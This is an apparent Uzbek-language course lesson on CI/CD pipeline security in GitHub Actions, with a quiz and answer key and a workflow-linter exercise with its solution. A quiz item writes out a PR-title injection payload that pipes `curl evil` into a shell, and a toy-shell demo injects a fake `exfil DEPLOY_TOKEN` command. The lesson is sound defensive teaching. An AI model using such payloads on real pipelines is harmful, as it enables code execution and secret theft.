---
n: 85
slug: cicd-xavfsizligi
title: "CI/CD xavfsizligi"
summary: "Pipeline ishlab chiqarishga eng yaqin va eng ko'p ishonilgan tizim: script injection, pull_request_target tuzog'i, uchinchi tomon action'lar, sirlar va token huquqlari, runner izolyatsiyasi va OIDC."
duration: 50
sources:
  - id: gh-actions-security
    note: "GitHub Actions secure use: sirlar (least privilege, redaction kafolatlanmaydi), script injection (action yoki oraliq muhit o'zgaruvchisi), pull_request_target va workflow_run xavfi, uchinchi tomon action'larni SHA bilan qotirish, self-hosted runner xavflari, OIDC"
  - id: cs-cicd
    note: "OWASP CI/CD Security Cheat Sheet: CICD-SEC-1..10 ro'yxati, SCM sozlamalari (protected branch, review, MFA), pipeline muhiti, IAM va least privilege, plug-in boshqaruvi, yaxlitlik, logging"
  - id: t10-a03
    note: "A03:2025: CI/CD pipeline qurilayotgan tizimdan zaifroq bo'lsa xavf; vazifalarni ajratish (separation of duty); environment-scoped secrets, signed builds, tamper-evident logs"
  - id: slsa
    note: "SLSA draft: Build L3 da build'lar bir-biriga ta'sir qila olmasligi va imzolash maxfiy materiali build qadamlariga ochiq bo'lmasligi talab qilinadi"
  - id: cs-secrets
    note: "OWASP Secrets Management Cheat Sheet 3-bo'lim: CI vositasidagi sirlar, OIDC federation, qisqa muddatli credential'lar, runtime sirlarini pipeline'dan o'tkazmaslik"
quiz:
  - q: "Workflow `run: echo \"title=${{ github.event.pull_request.title }}\"` qatoriga ega. PR sarlavhasi `x\"; curl evil | sh; echo \"` bo'lsa nima bo'ladi?"
    options:
      - "Hech narsa: GitHub ifodani avtomatik qochiradi (escape)"
      - "Sarlavha skript matniga qo'yiladi, shell uni buyruq sifatida o'qiydi va qo'shimcha buyruq bajariladi"
      - "Workflow ishga tushmaydi, chunki sarlavhada qo'shtirnoq bor"
      - "Faqat sarlavha logda ko'rinmaydi"
    answer: 1
    explain: "Ifoda skript yaratilishidan oldin matn sifatida o'rniga qo'yiladi, shuning uchun qo'shtirnoq va nuqta-vergul shell sintaksisiga aylanadi. Tuzatish: qiymatni env orqali berish, skript matni esa o'zgarmas qoladi."
  - q: "`pull_request_target` bilan ishga tushadigan workflow `actions/checkout` ga PR'ning head SHA'sini beradi va keyin `npm test` ishga tushiradi. Asosiy xavf qaysi?"
    options:
      - "Test sekin ishlaydi"
      - "Fork'dan kelgan notanish kod imtiyozli kontekstda (repo yozuv huquqi va sirlar bilan) bajariladi"
      - "Checkout noto'g'ri branch'ni oladi"
      - "npm test hech qachon ishlamaydi"
    answer: 1
    explain: "Bu trigger imtiyozli: asosiy branch kontekstida ishlaydi va sirlarga kira oladi. Ishonchsiz PR kodini checkout qilib bajarish hujumchiga shu imtiyozlarni beradi."
  - q: "Jamoa action'larni `@v4` tegi bilan chaqiradi. Nima uchun to'liq commit SHA'ga qotirish kuchliroq?"
    options:
      - "SHA qisqaroq yoziladi"
      - "Teg ko'chirilishi yoki o'chirilishi mumkin, commit SHA esa o'zgarmas obyektni bildiradi"
      - "SHA action'ni tezroq yuklaydi"
      - "Teg ishlamaydi, faqat SHA ishlaydi"
    answer: 1
    explain: "Repoga kirish olgan hujumchi tegni zararli commit'ga ko'chira oladi. SHA'ni soxtalashtirish SHA-1 kolliziyasini talab qiladi. Qotirish yangilanishni qo'lda boshqarishni talab qiladi: trade-off."
  - q: "CI uchun uzoq muddatli bulut access key'i repository secret sifatida saqlanadi. Qaysi variant xavfni eng ko'p kamaytiradi?"
    options:
      - "Key'ni ko'proq belgidan iborat qilish"
      - "Key'ni har yili almashtirish"
      - "OIDC federation: job har safar qisqa muddatli credential oladi, statik key bo'lmaydi"
      - "Key'ni workflow faylida emas, wiki'da saqlash"
    answer: 2
    explain: "Statik key chiqib ketsa, u muddatsiz ishlaydi. OIDC bilan credential job'ga xos va qisqa umrli; qo'shimcha: federation huquqi sirga kirish huquqidan ajratiladi."
  - q: "Public repozitoriyda self-hosted runner ishlatilmoqda. Nima uchun bu xavfli?"
    options:
      - "Runner doim sekin"
      - "Har kim PR ochib, runner'ni doimiy ravishda buzadigan kodni ishga tushirishi mumkin, chunki runner tozalangan VM kafolati bermaydi"
      - "Public repo uchun runner o'rnatib bo'lmaydi"
      - "Runner faqat private repo bilan ishlaydi"
    answer: 1
    explain: "GitHub-hosted runner har job uchun toza efemer VM; self-hosted runner bunday kafolatga ega emas va bitta job keyingisiga ta'sir qilishi mumkin (masalan, buyruq qatoridagi sirlar ps orqali ko'rinadi)."
  - q: "Pipeline'dagi `permissions` bloki yo'q va repozitoriy default token huquqi keng. Qaysi qoida yaxshiroq?"
    options:
      - "Default huquqni faqat o'qish, kerak bo'lgan job'ga alohida yozuv huquqi berish"
      - "Hamma job'larga yozuv huquqi berish, chunki xato kamayadi"
      - "Token'ni o'chirib tashlash"
      - "Huquqni foydalanuvchi tanlasin"
    answer: 0
    explain: "Least privilege: GITHUB_TOKEN uchun default minimal (contents: read), kerak joyda job darajasida oshiriladi. Shunda bitta buzilgan qadam hamma narsaga yozolmaydi."
task:
  title: "Workflow linter: to'rtta qoida"
  prompt: |
    `lint(text)` workflow matnini tekshiradi va topilmalar ro'yxatini qaytaradi. Hozir u faqat `uses:` ning to'liq commit SHA bilan qotirilganligini tekshiradi.

    Quyidagi qoidalarni qo'shing:
    1. `run:` qatorida `${{ github.event.` ifodasi bo'lsa: `"satr N: run ichida github.event ifodasi (script injection)"`.
    2. Workflow `pull_request_target` ni ishlatsa va `ref:` PR head'iga ishora qilsa (`github.event.pull_request.head`): `"pull_request_target bilan PR kodi checkout qilinadi"`.
    3. `permissions:` bloki yo'q bo'lsa (satr boshida): `"permissions bloki yo'q (GITHUB_TOKEN huquqlari ochiq qoladi)"`.

    Tartib: avval satr bo'yicha topilmalar (uses va run), keyin 2-qoida, keyin 3-qoida. Kutilgan natija: 4 ta topilma, `jami: 4`.
  lang: ts
  starter: |
    const workflow = `
    name: build
    on:
      pull_request_target:
    jobs:
      test:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
            with:
              ref: \${{ github.event.pull_request.head.sha }}
          - uses: example-org/cache-action@8f4b7f84864484a7bf31766abe9204da3c4b3b2a
          - run: echo "title=\${{ github.event.pull_request.title }}"
    `;

    // Boshlang'ich: faqat bitta qoida "uses:" to'liq (40 belgili) commit SHA bilan qotirilganmi
    function lint(text: string): string[] {
      const out: string[] = [];
      text.split("\n").forEach((line, i) => {
        const uses = line.match(/uses:\s*([^@\s]+)@(\S+)/);
        if (uses && !/^[0-9a-f]{40}$/.test(uses[2])) out.push(`satr ${i}: ${uses[1]}@${uses[2]} commit SHA bilan qotirilmagan`);
      });
      return out;
    }

    const found = lint(workflow);
    for (const f of found) console.log(f);
    console.log("jami:", found.length);
  solution: |
    const workflow = `
    name: build
    on:
      pull_request_target:
    jobs:
      test:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
            with:
              ref: \${{ github.event.pull_request.head.sha }}
          - uses: example-org/cache-action@8f4b7f84864484a7bf31766abe9204da3c4b3b2a
          - run: echo "title=\${{ github.event.pull_request.title }}"
    `;

    // Qoidalar: (1) uses SHA bilan qotirilgan, (2) pull_request_target + PR head checkout,
    // (3) run ichida github.event.* ifodasi (script injection), (4) permissions bloki yo'q
    function lint(text: string): string[] {
      const out: string[] = [];
      const lines = text.split("\n");
      lines.forEach((line, i) => {
        const uses = line.match(/uses:\s*([^@\s]+)@(\S+)/);
        if (uses && !/^[0-9a-f]{40}$/.test(uses[2])) out.push(`satr ${i}: ${uses[1]}@${uses[2]} commit SHA bilan qotirilmagan`);
        if (/run:.*\$\{\{\s*github\.event\./.test(line)) out.push(`satr ${i}: run ichida github.event ifodasi (script injection)`);
      });
      if (/pull_request_target/.test(text) && /ref:\s*\$\{\{\s*github\.event\.pull_request\.head/.test(text)) out.push("pull_request_target bilan PR kodi checkout qilinadi");
      if (!/^permissions:/m.test(text)) out.push("permissions bloki yo'q (GITHUB_TOKEN huquqlari ochiq qoladi)");
      return out;
    }

    const found = lint(workflow);
    for (const f of found) console.log(f);
    console.log("jami:", found.length);
  solutionNotes: |
    - Bu linter regex bilan ishlaydi, haqiqiy YAML parser emas: u formatlashga bog'liq va ko'p holatni o'tkazib yuboradi. Real loyihada workflow'larni tahlil qiladigan vosita ishlatiladi (masalan, CodeQL workflow tahlili yoki OpenSSF Scorecard: GitHub hujjati ikkalasini tilga oladi).
    - Birinchi va ikkinchi qoida GitHub hujjatidagi ikki asosiy xavfga mos: script injection va ishonchsiz PR kodini imtiyozli trigger'da checkout qilish.
    - Uchinchi qoida least privilege: `permissions` yo'q bo'lsa, token huquqi repo sozlamasidagi defaultga bog'liq.
    - Linter topilma yo'qligi xavfsizlikni isbotlamaydi (masalan, tashqi action ichidagi zaiflikni ko'rmaydi).
  checklist:
    - "uses: tegi SHA bilan qotirilmagan qator topiladi"
    - "run ichidagi github.event ifodasi script injection sifatida belgilanadi"
    - "pull_request_target va PR head checkout birga bo'lsa topiladi"
    - "permissions yo'qligi topiladi, natija tartibi kutilganday"
    - "Regex linter nimani ko'rmasligini ayta olasiz"
---

## Muammo

CI/CD pipeline production'ga eng yaqin joyda turadi va eng ko'p ishonch oladi. U manba kodni o'qiydi, bog'liqliklarni yuklaydi, sirlarga ega (deploy token, registry kalitlari, bulut credential'lari) va natijani production'ga chiqaradi. Hujumchi uchun bu ideal nishon: pipeline'ni buzsa, kodni, sirlarni va deploy'ni birdaniga qo'lga kiritadi. OWASP A03:2025 shu holatni "CI/CD pipeline qurilayotgan va deploy qilinayotgan tizimlardan zaifroq bo'lsa, ayniqsa murakkab bo'lsa" xavf deb belgilaydi va supply chain'ning har bir bo'g'ini (kod repozitoriy, build server, artefaktlar, infratuzilma kodi) mustahkamlanishini talab qiladi, shu jumladan vazifalarni ajratish: bitta odam kod yozib, uni nazoratsiz production'gacha olib chiqa olmasligi kerak.

Amaliy og'riqlar uchta. Birinchisi, pipeline'ga ishonchsiz kirish keladi: PR sarlavhasi, branch nomi, issue matni, fork'dan kelgan kod. Agar bu qiymatlar skript matniga qo'yilsa yoki imtiyozli kontekstda bajarilsa, tashqi odam pipeline'da kod bajaradi. Ikkinchisi, pipeline uchinchi tomon kodni ishga tushiradi (action'lar, plug-in'lar), va bittasining buzilishi hamma sirlarni ochadi. Uchinchisi, sirlar: uzoq muddatli statik credential'lar pipeline o'zgaruvchilarida yotadi.

Bu dars GitHub Actions hujjatiga (secure use reference) va OWASP CI/CD Security Cheat Sheet'ga tayanadi; tamoyillar boshqa CI tizimlariga ham ko'chadi, lekin aniq sintaksis GitHub'ga xos. 81 va 82-darslarda bog'liqliklar va artefakt kelib chiqishini ko'rdik; bu yerda ularni yig'ib, yetkazadigan tizim.

## Asosiy g'oya

OWASP CI/CD cheat sheet pipeline risklarini o'nta toifaga ajratadi (CICD-SEC-1 dan 10 gacha): yetarli bo'lmagan flow control, noto'g'ri IAM, dependency chain abuse, poisoned pipeline execution (PPE), yetarli bo'lmagan pipeline-based access control, credential gigienasi, xavfsiz bo'lmagan tizim sozlamalari, uchinchi tomon xizmatlarini nazoratsiz ishlatish, artefakt yaxlitligini noto'g'ri tekshirish, va yetarli bo'lmagan logging. Bu ro'yxatni uch savolga bog'lash qulay.

1. Kim pipeline'ni ishga tushira oladi va qanday kod bilan? Bu flow control va PPE: SCM sozlamalari (cheat sheet: auto-merge qoidalaridan qochish, PR review chetlab o'tilmasligi, protected branch'lar, imzolangan commit'lar, MFA, private repo'larni fork qilishni cheklash) va pipeline konfiguratsiyasining o'zi review qilinishi.
2. Pipeline nimaga ishonadi? Bu bog'liqliklar va uchinchi tomon action/plug-in'lari: ular pipeline ichida sizning huquqingiz bilan ishlaydi.
3. Pipeline qanday huquqlarga ega? Bu IAM, sirlar va token: minimal huquq, qisqa muddat, ajratilgan scope.

Cheat sheet least privilege'ni uchta joyga qo'llashni aytadi: pipeline qadamlari tashqi resurslarga kirish uchun ishlatadigan sirlar, bir pipeline yoki qadamning CI platformadagi boshqa resurslarga kirishi, va pipeline ishlaydigan node'lar. Qoida "ruxsat asoslangan bo'lishi kerak, taxmin qilinmasligi kerak", ya'ni deny by default.

## Chuqurroq: GitHub Actions'dagi aniq mexanizmlar

### Script injection

GitHub hujjati ifoda (`${{ ... }}`) workflow ishga tushishidan oldin hisoblanib, `run` skript matniga qo'yilishini va shuning uchun PR sarlavhasi kabi ishonchsiz qiymat shell kodiga aylanishi mumkinligini ko'rsatadi. Tavsiya etilgan ikki yechim: JavaScript action yaratish (kontekst qiymati argument sifatida beriladi, shell skript yaratishda ishlatilmaydi), yoki oraliq muhit o'zgaruvchisi: ifoda `env:` ga yoziladi va skript uni `$TITLE` sifatida o'qiydi. Hujjat tushuntirishicha, qiymat xotirada o'zgaruvchi sifatida saqlanadi va skript yaratish jarayoniga aralashmaydi. Hujjat shell o'zgaruvchilarini qo'shtirnoqqa olishni ham tilga oladi (word splitting uchun), lekin bu umumiy shell amaliyoti ekanini qayd etadi.

Mexanizmni o'quv "shell"ida ko'ring. Bu sodda model: nuqta-vergul (qo'shtirnoq tashqarida) buyruqlarni ajratadi, `$NAME` esa parse'dan keyin o'rniga qo'yiladi, ya'ni haqiqiy shell'ning kerakli xususiyatlari.

### pull_request_target va workflow_run

Hujjat `pull_request_target` va `workflow_run` trigger'lari ishonchsiz PR checkout bilan birga repozitoriyni xavf ostiga qo'yishini yozadi: bu workflow'lar imtiyozli, asosiy branch keshini boshqa imtiyozli trigger'lar bilan baham ko'radi, repozitoriyga yozuv huquqi va havola qilingan sirlarga kirishi mumkin, va bunday zaifliklar repozitoriyni egallashga olib kelishi mumkin. Tavsiyalar: zarur bo'lmasa `pull_request_target` dan qochish; huquqlarni ajratish uchun `workflow_run` yaxshiroq; ikkalasini ham ishonchsiz PR kodi bilan, shu jumladan fork'dan, ishlatmaslik; `workflow_run` da boshqa workflow yuklagan artefaktlarga ehtiyotkorlik bilan qarash.

### Uchinchi tomon action'lar

Hujjatga ko'ra bitta workflow ichidagi job'lar bir-biriga ta'sir qilishi mumkin (keyingi job'ning muhit o'zgaruvchilarini o'qish, umumiy papkaga yozish, Docker socket orqali boshqa konteynerlarni ko'rish). Shuning uchun bitta action buzilsa, repozitoriydagi hamma sirlarga kira oladi va `GITHUB_TOKEN` bilan repozitoriyga yozishi mumkin. Tavsiyalar: action'ni to'liq uzunlikdagi commit SHA'ga qotirish (hujumchi orqa eshik qo'shish uchun valid Git obyekti uchun SHA-1 kolliziyasini yaratishi kerak bo'ladi); tegga faqat yaratuvchiga ishonsangiz tayanish (teg ko'chirilishi yoki o'chirilishi mumkin); action manba kodini audit qilish (sirlar kutilmagan hostlarga ketmayaptimi). Hujjat yangi imkoniyatni ham eslatadi: workflow bog'liqliklarini lockfile bilan qotirish, bu har action uchun aniq commit va tranzitiv bog'liqliklarni yozadi va manba repozitoriy identifikatorini ish vaqtida tekshiradi; hujjat uni mavjud bo'lgan joyda SHA qotirishdan kuchliroq deb ataydi. Bu 81-dars lockfile g'oyasining workflow'larga ko'chishi.

### Sirlar va token

Hujjat: repozitoriyga yozuv huquqi bor har kim repozitoriydagi hamma sirlarni o'qiy oladi, shuning uchun workflow'dagi credential'lar minimal huquqli bo'lishi kerak. `GITHUB_TOKEN` uchun default huquqni contents bo'yicha faqat o'qishga qo'yish, kerak job'larda oshirish tavsiya etiladi. Yashirish (redaction) kafolatlanmaydi: sirni o'zgartirish usullari ko'p, shuning uchun hosil qilingan qiymatlarni (Base64, URL-encode, JWT) ham sir sifatida ro'yxatdan o'tkazish, strukturali ma'lumotni (JSON, YAML) bitta sir qilmaslik tavsiya etiladi. Log'ga chiqib ketgan sir uchun log o'chiriladi va sir rotatsiya qilinadi. Muhit sirlarini himoya qilish uchun required reviewers ishlatish mumkin: tasdiq berilmaguncha job sirga kira olmaydi.

Secrets Management cheat sheet qo'shadi: pipeline'ni statik bulut kalitidan voz kechtirish uchun OIDC va workload identity federation, federation huquqini (token almashtirish) aniq sirga kirish huquqidan ajratish, job doirasidagi qisqa muddatli credential'lar, va eng kuchli variant: runtime sirlarini pipeline'dan umuman o'tkazmaslik, ilova ularni ish vaqtida secrets manager'dan o'zi olsin.

### Runner'lar

GitHub-hosted runner'lar efemer, izolyatsiyalangan VM'larda ishlaydi. Self-hosted runner'lar bunday kafolatga ega emas va ishonchsiz kod ularni doimiy buzishi mumkin, shuning uchun hujjat ularni public repozitoriylar uchun deyarli hech qachon ishlatmaslikni tavsiya qiladi: har kim PR ochib muhitni buzishi mumkin. Runner mashinasidagi sirlar (SSH kalitlari, API token'lar) va sezgir xizmatlarga tarmoq kirishi (masalan, bulut metadata xizmati) minimal bo'lishi kerak. Har job'dan keyin runner'ni yo'q qilish yetarli emas: hujjatga ko'ra bir runner faqat bitta job bajarishiga kafolat yo'q va ba'zi job'lar sirlarni buyruq qatori argumenti sifatida ishlatadi, ularni `ps` orqali boshqa job ko'rishi mumkin; just-in-time runner'lar bu uchun alohida bo'lim. SLSA draftining Build L3 talabi shu g'oya bilan mos: build'lar bir-biriga ta'sir qilmasligi (hatto bitta loyiha ichida) va imzolash maxfiy materiali foydalanuvchi build qadamlariga ochiq bo'lmasligi.

## Misol: PR sarlavhasi orqali buyruq bajarish

Quyidagi model faqat o'quv "shell"iga qarshi: haqiqiy buyruqlar bajarilmaydi, `exfil` shunchaki "BAJARILDI" deb chop etadigan soxta buyruq.

### 1. Zaif kod

Ifoda skript matniga shablon sifatida qo'yiladi (haqiqiy workflow'dagi `run: echo "..${{ title }}"` ga mos):

```ts run
// O'quv "shell": ; va yangi qator buyruqlarni ajratadi (qo'shtirnoq tashqarida), $NAME esa parse'dan KEYIN o'rniga qo'yiladi
function runScript(script: string, env: Record<string, string>): string[] {
  const cmds: string[] = [];
  let cur = "", q = false;
  for (const ch of script) {
    if (ch === '"') { q = !q; cur += ch; }
    else if ((ch === ";" || ch === "\n") && !q) { cmds.push(cur.trim()); cur = ""; }
    else cur += ch;
  }
  if (cur.trim()) cmds.push(cur.trim());
  const out: string[] = [];
  for (const c of cmds.filter(Boolean)) {
    const [name, ...rest] = c.match(/"[^"]*"|\S+/g) ?? [];
    const args = rest.map((a) => a.replace(/^"|"$/g, "").replace(/\$(\w+)/g, (_, k) => env[k] ?? ""));
    if (name === "echo") out.push("echo: " + args.join(" "));
    else out.push(`BAJARILDI: ${name} ${args.join(" ")}`.trim());
  }
  return out;
}

const prTitle = 'fix typo"; exfil DEPLOY_TOKEN; echo "';

// ZAIF: ifoda skript matniga shablon sifatida qo'yiladi (${{ ... }} kabi), keyin shell o'qiydi
const script = 'echo "PR sarlavhasi: ${title}"'.replace("${title}", prTitle);
console.log(script);
for (const line of runScript(script, {})) console.log(line);
```

### 2. Hujum

Hujumchi PR sarlavhasiga qo'shtirnoq va nuqta-vergul qo'yadi. Skript matni almashtirilgach, shell uchun uchta buyruq paydo bo'ladi:

```text
echo "PR sarlavhasi: fix typo"; exfil DEPLOY_TOKEN; echo ""
echo: PR sarlavhasi: fix typo
BAJARILDI: exfil DEPLOY_TOKEN
echo:
```

Ikkinchi buyruq (`exfil DEPLOY_TOKEN`) hujumchi yozgan: u sirni tashqariga jo'natishga mo'ljallangan buyruqni ifodalaydi. Skript muallifi buni ko'zda tutmagan.

### 3. Tuzatilgan kod

Qiymat skript matniga emas, muhit o'zgaruvchisiga beriladi; skript matni o'zgarmas va `$TITLE` parse'dan keyin ma'lumot sifatida o'rniga qo'yiladi.

```ts run
function runScript(script: string, env: Record<string, string>): string[] {
  const cmds: string[] = [];
  let cur = "", q = false;
  for (const ch of script) {
    if (ch === '"') { q = !q; cur += ch; }
    else if ((ch === ";" || ch === "\n") && !q) { cmds.push(cur.trim()); cur = ""; }
    else cur += ch;
  }
  if (cur.trim()) cmds.push(cur.trim());
  const out: string[] = [];
  for (const c of cmds.filter(Boolean)) {
    const [name, ...rest] = c.match(/"[^"]*"|\S+/g) ?? [];
    const args = rest.map((a) => a.replace(/^"|"$/g, "").replace(/\$(\w+)/g, (_, k) => env[k] ?? ""));
    if (name === "echo") out.push("echo: " + args.join(" "));
    else out.push(`BAJARILDI: ${name} ${args.join(" ")}`.trim());
  }
  return out;
}

const prTitle = 'fix typo"; exfil DEPLOY_TOKEN; echo "';

// TUZATILGAN: qiymat skript matniga emas, muhit o'zgaruvchisiga beriladi; skript o'zgarmas
const script = 'echo "PR sarlavhasi: $TITLE"';
console.log(script);
for (const line of runScript(script, { TITLE: prTitle })) console.log(line);
```

```text
echo "PR sarlavhasi: $TITLE"
echo: PR sarlavhasi: fix typo"; exfil DEPLOY_TOKEN; echo "
```

Nima yopildi: sarlavhadagi `;` va `"` endi sintaksis emas, oddiy matn. Hujum skript yaratish bosqichida bo'lgani uchun u butunlay yopildi. Nima yopilmadi: qiymat bu skriptdan keyin boshqa joyga (masalan, boshqa shell buyrug'iga yoki `eval`ga) uzatilsa, muammo qayta paydo bo'ladi; ishonchsiz PR kodini imtiyozli kontekstda bajarish; buzilgan uchinchi tomon action. Tuzatish faqat shu bitta ifoda uchun to'g'ri.

### Workflow'ni tekshiruvchi oddiy linter

Quyidagi kod bitta qoidani tekshiradi: `uses:` to'liq commit SHA bilan qotirilganmi. Workflow namunasida ataylab uchta muammo bor: tegli action, `run` ichida PR sarlavhasi va `pull_request_target` bilan PR head checkout. Birinchi qoida faqat birinchisini ushlaydi; qolganlarini topshiriqda qo'shasiz.

```ts run
const workflow = `
name: build
on:
  pull_request_target:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}
      - uses: example-org/cache-action@8f4b7f84864484a7bf31766abe9204da3c4b3b2a
      - run: echo "title=\${{ github.event.pull_request.title }}"
`;

// Bitta qoida: "uses:" to'liq (40 belgili) commit SHA bilan qotirilganmi
function lint(text: string): string[] {
  const out: string[] = [];
  text.split("\n").forEach((line, i) => {
    const uses = line.match(/uses:\s*([^@\s]+)@(\S+)/);
    if (uses && !/^[0-9a-f]{40}$/.test(uses[2])) out.push(`satr ${i}: ${uses[1]}@${uses[2]} commit SHA bilan qotirilmagan`);
  });
  return out;
}

const found = lint(workflow);
for (const f of found) console.log(f);
console.log("jami:", found.length);
```

```text
satr 8: actions/checkout@v4 commit SHA bilan qotirilmagan
jami: 1
```

## Qachon qo'llamaslik kerak

- Hamma action'ni SHA'ga qotirib, yangilashni unutish. Qotirilgan action eskiradi va uning zaiflik tuzatishlari kelmaydi (A03 yangilashni risk asosida, o'z vaqtida bajarishni talab qiladi). Yangilashni avtomatlashtirilgan, review qilinadigan jarayonga (masalan, Dependabot) bog'lang; GitHub hujjati Dependabot version update'ni action'larni yangilab turish uchun tilga oladi.
- Required reviewer'ni har job'ga qo'yish. Deploy'ga qo'yish mantiqli, har test job'iga qo'yilsa, jamoa tasdiqni mexanik bosadi va nazorat ma'nosini yo'qotadi.
- `pull_request_target` ni butunlay taqiqlash. Ba'zi avtomatlashtirish (label qo'yish, izoh yozish) shu trigger'da ishlaydi; qoida: ishonchsiz kodni checkout qilmaslik va huquqni minimal qilish.
- Self-hosted runner'dan butunlay voz kechish. Ichki tarmoqqa kirish yoki maxsus apparat kerak bo'lsa ular zarur; shunda ular faqat ishonchli repozitoriylar uchun, alohida guruhlarda, minimal sirlar bilan ishlatiladi.
- Regex linterni xavfsizlik kafolati deb qabul qilish. U formatlashga bog'liq va ko'p holatni ko'rmaydi.

## Stack'da: GitHub Actions bilan Node.js/Next.js

- `permissions:` blokini workflow darajasida `contents: read` ga qo'ying va yozuv huquqini faqat kerak job'da oshiring.
- PR/issue matnlarini (`title`, `body`, branch nomi) hech qachon `run` ga to'g'ridan-to'g'ri qo'ymang: `env:` orqali bering.
- `actions/checkout` ni imtiyozli trigger'da PR head bilan ishlatmang. Fork'dan kelgan PR uchun testlarni imtiyozsiz `pull_request` da, natijani alohida workflow orqali bildiring.
- Deploy job'ini `environment` ga bog'lab required reviewer qo'ying, bulut kirish uchun OIDC ishlating (81 va 69-darslardagi statik token xavfi bilan bog'liq), npm paketini e'lon qilishda trusted publishing (82-dars).
- Build'da `npm ci` (81-dars), SAST va secret scanning (83-dars) qadamlari; DAST staging'da (84-dars).
- CODEOWNERS bilan `.github/workflows` o'zgarishini xavfsizlik jamoasi yoki tajribali muhandis review qilsin: pipeline konfiguratsiyasi kod kabi review qilinadi (cheat sheet shuni tavsiya qiladi).

## Xulosa

- Pipeline production'ga eng yaqin va eng ko'p ishonilgan tizim: u qurilayotgan tizimdan zaifroq bo'lmasligi kerak (A03).
- Ishonchsiz kirishni (PR sarlavhasi, branch nomi) skript matniga qo'ymang: env orqali bering. Bu script injection'ni mexanizm darajasida yopadi.
- `pull_request_target` va `workflow_run` imtiyozli: ishonchsiz kodni ular bilan checkout qilib bajarmang.
- Uchinchi tomon action'ni commit SHA yoki workflow lockfile bilan qotiring; teg ko'chirilishi mumkin.
- Sirlar: minimal huquq, qisqa muddat, OIDC; log'ga chiqqan sir rotatsiya qilinadi. Runner izolyatsiyasi (self-hosted xavfi) alohida qaror.
- Bu darsdagi barcha aniq GitHub xatti-harakatlari secure use hujjatidan; boshqa CI tizimlari uchun tamoyil bir xil, sintaksis boshqa.
